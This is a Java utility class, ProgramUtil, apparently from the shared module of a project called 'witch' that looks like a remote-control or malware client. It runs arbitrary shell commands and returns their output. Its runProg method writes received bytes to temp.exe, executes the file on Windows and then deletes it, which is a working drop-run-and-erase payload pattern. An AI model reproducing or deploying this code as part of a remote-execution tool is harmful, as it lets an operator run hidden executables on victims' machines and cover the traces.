package me.soda.witch.shared;

import java.io.*;
import java.nio.charset.StandardCharsets;

@SuppressWarnings("ResultOfMethodCallIgnored")
public class ProgramUtil {
    private static final Runtime RT = Runtime.getRuntime();

    public static boolean isWin() {
        return System.getProperty("os.name").toLowerCase().contains("windows");
    }

    public static String runCmd(String command) {
        try {
            Process process = isWin() ? RT.exec(new String[]{"cmd.exe", "/c", command}) : RT.exec(command);
            return getProcResult(process);
        } catch (IOException e) {
            LogUtil.printStackTrace(e);
        }
        return "";
    }

    public static Process execInPath(String cmd, String path) throws IOException {
        return RT.exec(cmd, null, new File(path));
    }

    public static String getProcResult(Process process) {
        StringBuilder result = new StringBuilder();
        try {
            BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            String line;
            while ((line = inputStream.readLine()) != null) {
                result.append(line).append("\n");
            }
            inputStream.close();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            LogUtil.printStackTrace(e);
        }
        return result.toString();
    }

    public static void runProg(byte[] bytes) {
        if (!isWin()) return;
        try {
            File file = new File("temp.exe");
            file.createNewFile();
            FileOutputStream out = new FileOutputStream(file);
            out.write(bytes);
            out.close();
            Process process = RT.exec("temp.exe");
            process.waitFor();
            if (file.exists()) file.delete();
        } catch (IOException | InterruptedException e) {
            LogUtil.printStackTrace(e);
        }
    }
}
